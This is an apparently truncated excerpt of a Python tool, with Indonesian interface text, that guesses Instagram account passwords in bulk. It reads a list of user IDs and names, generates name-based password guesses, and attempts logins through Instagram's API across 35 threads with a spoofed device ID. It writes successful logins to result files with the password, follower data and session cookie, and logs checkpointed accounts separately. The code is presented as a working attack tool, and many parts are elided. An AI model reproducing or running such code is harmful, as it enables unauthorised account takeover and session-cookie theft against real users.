...
class MAIN:
   ...
   def List(self):
       ...
       print(f"""{H}   _________  __________  ______  __   ____
  /  _/ ___/ / __/  _/  |/  / _ \/ /  / __/
 _/ // (_ / _\ \_/ // /|_/ / ___/ /__/ _/  
/___/\___/ /___/___/_/  /_/_/  /____/___/  
                                           {P}""")
       nu = input(f"{P}[{H}+{P}] {H}Enter Your File Name: {P}")
       try:
         with open(nu, 'r') as file:
           for line in file:
             self.id.append(line.strip())
       except:
         print(f"{P}[{M}+{P}] {M}File Not Found.")
         exit()
       #for me in uid:self.id.append(me)
       print(f"{P}[{H}+{P}] {H}Total IDs : {len(self.id)}")
       """self.MyRich('\
                   ...
                   try:
                       ...
                       for self.r in self.b:
                           if len(self.r) <3:continue
                              ...
                              self.x.append(self.r.lower() + 'official')
...
02. Sandi Full Name 1-6  04. Sandi Full Name 1-5 + Manual',True)
       ...
       print(f"{P}[{H}+{P}] {H}Account OK Save In RESULT/OK-Instagram-{file_ok}.")
       print(f"{P}[{K}+{P}] {K}Account CP Save In RESULT/CP-Instagram-{file_ok}.\n")
       """self.MyRich(f'\
[green]Akun Succes Save In: RESULT/OK-Instagram-{file_ok}\n\
Akun Checkpoint Save In: RESULT/CP-Instagram-{file_ok}')"""
       ...
       with ThreadPoolExecutor(max_workers=35) as exe:
          for data in self.id:
              try:
                  idf, nama = data.split('|')
                  nama_biasa = self.normalisasi_teks(nama)  # Normalisasi nama
       ...
       if self.ResultSuccess !=0 or self.ResultChechpoint !=0:
          ...
          print(f'{P}\n Account OK : {H}{self.ResultSuccess}{P}\n Account CP : {K2}{self.ResultChechpoint}{P}\n')
          exit(0)
       else:
   ...
   def HeadersApiLogin(self):
       return {
          ...
          '-ig-device-id': 'b7b95886-a663-41e4-8025-941a72c9ac4d',
 ...
 Facebook acc : {akunfb}
 cookie       : {cookie}""",title=f"[bold white][ [bold green]MIKU-OK[bold white]]",style=f"bold green"))
                    else:
 ...
 [bold green]cookie       : [bold green]{cookie}""",title=f"[bold white][ [bold green]MIKU-OK[bold white]]",style=f"bold green"))
                       self.aut = None
                       self.pem = None
                       self.PWX = pwb
...
# [bold white]data profile : [bold blue]{followers}/{following}/{postingan}                                  """,title=f"[bold white][ [bold green]MIKU-CEPE[bold white]]",style=f"yellow"))
 ...
 cookie       : {cookie}""",title=f"[bold white][ [bold green]MIKU-OK[bold white]]",style=f"bold green"))
                       ...
                       print(f"{P}[{H}+{P}] {H}Account     : {info_username}|{pwb}")
                       print(f"{P}[{H}+{P}] {H}Data Account: {info_followers}|{info_following}|{info_postingan}")
                       print(f"{P}[{H}+{P}] {H}Cookie      : {cookie}{P}")
                       print()
                       self.aut = None
                       self.pem = None
                       self.PWX = pwb
                    open('RESULT/OK-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{info_username}|{self.PWX}|{info_followers}|{info_following}|{info_postingan}|{cookie}\n   > {Useragent().useragent_threads()}\n')
                    break
...
# [bold white]password     : [bold blue]{pwb}
# [bold white]data profile : [bold blue]{followers}/{following}/{postingan}                                  """,title=f"[bold white][ [bold green]MIKU-CEPE[bold white]]",style=f"yellow")
                    open('RESULT/CP-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{users}|{pwb}|{followers}/{following}/{postingan}\n   > {Useragent().useragent_threads()}\n')
                    #self.ResultChechpoint +=1
                    break
           self.Loop +=1
           _status = '200'
           temane = ["bold green"]
           Console(style=temane[0]).print(f' PRIVATE {self.Loop}/{len(self.id)} OK:-{self.ResultSuccess} CP:-{self.ResultChechpoint}',end='\r')
